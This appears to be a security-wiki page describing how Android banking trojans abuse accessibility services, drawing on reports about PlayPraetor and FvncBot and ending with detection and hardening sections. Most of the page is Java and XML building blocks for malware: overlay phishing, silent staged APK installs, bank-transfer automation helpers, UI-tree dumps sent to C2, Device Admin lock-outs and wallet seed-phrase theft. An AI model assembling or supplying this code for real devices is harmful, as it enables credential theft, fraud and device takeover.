# Android Accessibility Service Abuse

{{#include ../../banners/hacktricks-training.md}}

## Overview

`AccessibilityService` was created to help users with disabilities interact with Android devices.  Unfortunately, the same **powerful automation APIs** (global navigation, text input, gesture dispatch, overlay windows…) can be weaponised by malware to gain **complete remote control** of the handset _without root privileges_.

Modern Android banking Trojans and Remote-Access-Trojans (RATs) such as **PlayPraetor, SpyNote, BrasDex, SOVA, ToxicPanda** and many others follow the same recipe:

1. Social-engineer the victim into enabling a rogue accessibility service (the *BIND_ACCESSIBILITY_SERVICE* permission is considered "high-risk" and requires an explicit user action).
2. Leverage the service to
   * capture every UI event & text that appears on screen,
   * inject synthetic gestures (`dispatchGesture`) and global actions (`performGlobalAction`) to automate any task the operator desires,
   * draw full-screen overlays on top of legitimate apps using the **TYPE_ACCESSIBILITY_OVERLAY** window type (no `SYSTEM_ALERT_WINDOW` prompt!),
   * silently grant additional runtime permissions by clicking on the system dialogs on the victim’s behalf.
3. Exfiltrate data or perform **On-Device-Fraud (ODF)** in real-time while the user is looking at a perfectly normal screen.

---

## Requesting the permission

```xml
<!-- AndroidManifest.xml -->
<service
    android:name="com.evil.rat.EvilService"
    android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
    android:exported="false">

    <intent-filter>
        <action android:name="android.accessibilityservice.AccessibilityService" />
    </intent-filter>

    <meta-data android:name="android.accessibilityservice"
        android:resource="@xml/evil_accessibility_config"/>
</service>
```

The companion XML defines how the fake dialog will look like:

```xml
<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:description="@string/service_description"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:notificationTimeout="200"
    android:canPerformGestures="true"
    android:canRetrieveWindowContent="true"/>
```

---

## Remote UI automation primitives

<details>
<summary>Sample AccessibilityService automation</summary>

```java
public class EvilService extends AccessibilityService {
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // harvest text or detect foreground app change
    }

    // Simulate HOME / BACK / RECENTS …
    private void navHome()     { performGlobalAction(GLOBAL_ACTION_HOME); }
    private void navBack()     { performGlobalAction(GLOBAL_ACTION_BACK); }
    private void openRecents() { performGlobalAction(GLOBAL_ACTION_RECENTS); }

    // Generic tap / swipe
    public void tap(float x, float y) {
        Path p = new Path(); p.moveTo(x, y);
        GestureDescription.StrokeDescription s = new GestureDescription.StrokeDescription(p, 0, 50);
        dispatchGesture(new GestureDescription.Builder().addStroke(s).build(), null, null);
    }
}
```

</details>

With only these two APIs an attacker can:
* Unlock the screen, open the banking app, navigate its UI tree and submit a transfer form.
* Accept every permission dialog that pops up.
* Install/update extra APKs via the Play Store intent.

---

## Abuse patterns

### 1. Overlay Phishing (Credential Harvesting)
A transparent or opaque `WebView` is added to the window manager:

```java
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
        MATCH_PARENT, MATCH_PARENT,
        TYPE_ACCESSIBILITY_OVERLAY,                      // ⬅ bypasses SYSTEM_ALERT_WINDOW
        FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCH_MODAL,       // touches still reach the real app
        PixelFormat.TRANSLUCENT);
wm.addView(phishingView, lp);
```

The victim types credentials into the fake form while the background app receives the same gestures – no suspicious "draw over other apps" prompt is ever shown.

> Detailed example: the *Accessibility Overlay Phishing* section inside the Tapjacking page.

### 2. On-Device Fraud automation
Malware families such as **PlayPraetor** maintain a persistent WebSocket channel where the operator can issue high-level commands (`init`, `update`, `alert_arr`, `report_list`, …).  The service translates those commands into the low-level gestures above, achieving real-time unauthorized transactions that easily bypass multi-factor-authentication tied to that very device.

### 3. Screen streaming & monitoring
By combining the **MediaProjection API** with an RTMP client library, the RAT can broadcast the live framebuffer to `rtmp://<c2>:1935/live/<device_id>`, giving the adversary perfect situational awareness while the Accessibility engine drives the UI. Newer banking trojans additionally bootstrap a **Fast Reverse Proxy (FRP)** binary and upgrade it to a **WebSocket** stream when an `enable_ws` (or similar) push command arrives. That bi-directional socket carries high-frequency screenshots and synthetic gestures, effectively giving the operator an **HVNC session** that works even when the victim cannot notice anything on screen.

### 4. Session-based multi-stage installers
Android 13+ aggressively throttles background installs invoked through spoofed accessibility clicks. A common workaround is to **embed the second-stage APK under `assets/`** and side-load it with the **session-based `PackageInstaller` API** so the loader controls the whole UX while the origin of the payload remains opaque to the user:

```java
PackageInstaller pi = getPackageManager().getPackageInstaller();
int id = pi.createSession(new SessionParams(SessionParams.MODE_FULL_INSTALL));
try (Session s = pi.openSession(id);
     InputStream in = getAssets().open("com.fvnc.app.apk");
     OutputStream out = s.openWrite("base.apk", 0, -1)) {
    in.transferTo(out);
    s.commit(PendingIntent.getBroadcast(this, 0, new Intent(this, InstallReceiver.class), 0).getIntentSender());
}
```

*Steps seen in the wild*
1. Drop the payload unencrypted in `assets/`.
2. Open a session, stream the bytes, commit and immediately deep-link the victim into the Accessibility settings so the second stage can be activated.
3. Report installation status (success/failure) back to the loader C2 for infection tracking.

The install dialog still appears, but everything else (UI strings, fake “security component” prompts, telemetry) is under attacker control.

### 5. Accessibility keylogging buffers & real-time exfiltration
Instead of hooking the keyboard, the RAT subscribes to `TYPE_VIEW_TEXT_CHANGED`, `TYPE_VIEW_FOCUSED`, `TYPE_WINDOW_STATE_CHANGED`, etc. Every event becomes a log record containing the focused app/activity, widget coordinates, and the actual text. Operators implement a **ring buffer** (e.g., 1 000 events) that is flushed over HTTP when full, while an active WebSocket tunnel streams the same events immediately to capture OTPs before they expire. Because everything happens inside the Accessibility service, no additional permissions are needed and foreground UI never shows a “keyboard” indicator.

### 6. Web-inject overlays with WebView bridges
Overlay phishing is no longer just a static HTML asset. Modern kits:
* Keep a **configuration file in `SharedPreferences`** mapping package names → overlay template URLs, per-app locale strings, and capture requirements.
* Inflate a full-screen `WebView` from the Accessibility service, load the remote phishing page, and register a `@JavascriptInterface` so JavaScript can post captured credentials/PINs/Card data straight back to native code.
* Close the overlay OR launch the ATS automation module once the victim has typed everything, ensuring the real banking app underneath receives the same touches (so transfers happen in the legitimate UI session).

This approach eliminates the Play Store “draw over other apps” dialog, gives operators on-the-fly phishing templates, and works across multiple banks without shipping new APKs.

---

## PlayPraetor – command & control workflow

1. **HTTP(S) heartbeat** – iterate over a hard-coded list until one domain answers `POST /app/searchPackageName` with the active C2.
2. **WebSocket (port 8282)** – bidirectional JSON commands:
   * `update` – push new conf/APKs
   * `alert_arr` – configure overlay templates
   * `report_list` – send list of targeted package names
   * `heartbeat_web` – keep-alive
3. **RTMP (port 1935)** – live screen/video streaming.
4. **REST exfiltration** –
   * `/app/saveDevice` (fingerprint)
   * `/app/saveContacts` | `/app/saveSms` | `/app/uploadImageBase64`
   * `/app/saveCardPwd` (bank creds)

The **AccessibilityService** is the local engine that turns those cloud commands into physical interactions.

---

## FvncBot-style loader & C2 fingerprints

### Cleartext registration endpoints
The FvncBot payload registers itself over plain HTTP (`naleymilva.it.com`) using static JSON structures, making the traffic trivial to fingerprint and replay in sandboxes.

```http
POST /api/v1/devices/register HTTP/1.1
Host: <c2>
Content-Type: application/json

{
  "device_id": "device_<id>",
  "fcm_token": "<token>",
  "device_info": { ... },
  "optimization_stats": { ... }
}
```

* `device_info` enumerates manufacturer, model, Android API level, app version, and screen size so operators can prioritise valuable hardware.
* `optimization_stats` reports OEM power-management knobs (aggressiveness score, polling interval, foreground-service flag), allowing the C2 to decide when to wake modules or keep them dormant.
* Campaign-specific values such as `build_id = "call_pl"` or `1.0-P` instantly reveal geo-targeting in passive network captures.

### Push-to-WebSocket escalation
Initial orchestration is done through **Firebase Cloud Messaging (FCM)**. When the bot receives the `enable_ws` (or equivalent) push command it launches an embedded **Fast Reverse Proxy (FRP)** client, pivots through the operator infrastructure, and upgrades the tunnel to a WebSocket session. That session multiplexes:
* Low-latency screen streaming frames (better than periodic HTTP uploads).
* Real-time forwarding of Accessibility keylogging events.
* Synthetic gestures/keyboard events that provide an invisible **HVNC** channel over the victim’s legitimate banking session.

The loader keeps reporting install/activation progress to the same telemetry host, so defenders can sinkhole the endpoint and immediately enumerate compromised builds.

### Leveraging debug artefacts for hunting
Even heavily obfuscated samples often keep developer log strings such as “WS connected”, “keylog buffer flushed”, etc. Analysts can patch the downloaded DEX modules to force the debug branches to execute and then observe deterministic markers in `logcat`. Threat hunters can monitor managed fleets for those strings or for suspicious FRP/`frpc` processes being spawned from non-system apps.

---

## Detecting malicious accessibility services

* `adb shell settings get secure enabled_accessibility_services`
* Settings → Accessibility → *Downloaded services* – look for apps that are **not** from Google Play.
* MDM / EMM solutions can enforce `ACCESSIBILITY_ENFORCEMENT_DEFAULT_DENY` (Android 13+) to block sideloaded services.
* Analyse running services:
  ```bash
  adb shell dumpsys accessibility | grep "Accessibility Service"
  ```
* Network telemetry should flag **cleartext POSTs to `/api/v1/devices/register`** (often pointing to look-alike banking domains) when the JSON body contains both `device_info` and `optimization_stats` objects.
* Monitor for user-installed apps invoking `PackageInstaller.Session` immediately after reading APK bytes from their own `assets/` directory—this is characteristic of staged loaders like the fake “mBank security key”.
* EDR/MDM agents can alert when an app spawns binaries named `frp`/`frpc` or opens persistent WebSocket tunnels shortly after receiving an FCM push notification.
* Collect `logcat` from quarantined devices and search for leftover developer strings such as “enable_ws”, “KeyloggerBufferSend”, or “WS reconnect”, which remain readable even when classes are otherwise obfuscated.

---

## Hardening recommendations for app developers

* Mark sensitive views with `android:accessibilityDataSensitive="accessibilityDataPrivateYes"` (API 34+).
* Combine `setFilterTouchesWhenObscured(true)` with `FLAG_SECURE` to prevent tap/overlay hijacking.
* Detect overlays by polling `WindowManager.getDefaultDisplay().getFlags()` or the `ViewRootImpl` API.
* Refuse to operate when `Settings.canDrawOverlays()` **or** a non-trusted Accessibility service is active.

---

## ATS automation cheat-sheet (Accessibility-driven)
Malware can fully automate a bank app with only Accessibility APIs. Generic primitives:

<details>
<summary>Common helper methods</summary>

```java
// Helpers inside your AccessibilityService
private List<AccessibilityNodeInfo> byText(String t){
  AccessibilityNodeInfo r = getRootInActiveWindow();
  return r == null ? Collections.emptyList() : r.findAccessibilityNodeInfosByText(t);
}
private boolean clickText(String t){
  for (AccessibilityNodeInfo n: byText(t)){
    if (n.isClickable()) return n.performAction(ACTION_CLICK);
    AccessibilityNodeInfo p = n.getParent();
    if (p != null) return p.performAction(ACTION_CLICK);
  }
  return false;
}
private void inputText(AccessibilityNodeInfo field, String text){
  Bundle b = new Bundle(); b.putCharSequence(ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
  field.performAction(ACTION_SET_TEXT, b);
}
private void tap(float x, float y){
  Path p = new Path(); p.moveTo(x,y);
  dispatchGesture(new GestureDescription.Builder()
    .addStroke(new GestureDescription.StrokeDescription(p,0,40)).build(), null, null);
}
```

</details>

Example flow (Czech → English labels):
- "Nová platba" (New payment) → click
- "Zadat platbu" (Enter payment) → click
- "Nový příjemce" (New recipient) → click
- "Domácí číslo účtu" (Domestic account number) → focus and `ACTION_SET_TEXT`
- "Další" (Next) → click → … "Zaplatit" (Pay) → click → enter PIN

Fallback: hard-coded coordinates with `dispatchGesture` when text lookup fails due to custom widgets.

Also seen: pre-steps to `check_limit` and `limit` by navigating to limits UI and increasing daily limits before transfer.

## Text-based pseudo-screen streaming
For low-latency remote control, instead of full video streaming, dump a textual representation of the current UI tree and send it to C2 repeatedly.

```java
private void dumpTree(AccessibilityNodeInfo n, String indent, StringBuilder sb){
  if (n==null) return;
  Rect b = new Rect(); n.getBoundsInScreen(b);
  CharSequence txt = n.getText(); CharSequence cls = n.getClassName();
  sb.append(indent).append("[").append(cls).append("] ")
    .append(txt==null?"":txt).append(" ")
    .append(b.toShortString()).append("\n");
  for (int i=0;i<n.getChildCount();i++) dumpTree(n.getChild(i), indent+"  ", sb);
}
```

This is the basis for commands like `txt_screen` (one-shot) and `screen_live` (continuous).

## Device Admin coercion primitives
Once a Device Admin receiver is activated, these calls increase opportunities to capture credentials and maintain control:

```java
DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
ComponentName admin = new ComponentName(this, AdminReceiver.class);

// 1) Immediate lock
dpm.lockNow();

// 2) Force credential change (expire current PIN/password)
dpm.setPasswordExpirationTimeout(admin, 1L); // may require owner/profile-owner on recent Android

// 3) Disable biometric unlock to force PIN/pattern entry
int flags = DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
            DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS;
dpm.setKeyguardDisabledFeatures(admin, flags);
```

Note: the exact availability of these policies varies by Android version and OEM; validate the device policy role (admin vs owner) during testing.

## Crypto wallet seed-phrase extraction patterns
Observed flows for MetaMask, Trust Wallet, Blockchain.com and Phantom:
- Unlock with stolen PIN (captured via overlay/Accessibility) or provided wallet password.
- Navigate: Settings → Security/Recovery → Reveal/Show recovery phrase.
- Collect phrase via keylogging the text nodes, secure-screen bypass, or screenshot OCR when text is obscured.
- Support multiple locales (EN/RU/CZ/SK) to stabilise selectors – prefer `viewIdResourceName` when available, fallback to multilingual text matching.

## NFC-relay orchestration
Accessibility/RAT modules can install and launch a dedicated NFC-relay app (e.g., NFSkate) as a third stage and even inject an overlay guide to shepherd the victim through card-present relay steps.

Background and TTPs: [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)

---

## References
* [PlayPraetor’s evolving threat: How Chinese-speaking actors globally scale an Android RAT](https://www.cleafy.com/cleafy-labs/playpraetors-evolving-threat-how-chinese-speaking-actors-globally-scale-an-android-rat)
* [Android accessibility documentation – Automating UI interaction](https://developer.android.com/guide/topics/ui/accessibility/service)
* [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
* [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
* [Intel 471 – New FvncBot Android banking trojan targets Poland](https://www.intel471.com/blog/new-fvncbot-android-banking-trojan-targets-poland)

{{#include ../../banners/hacktricks-training.md}}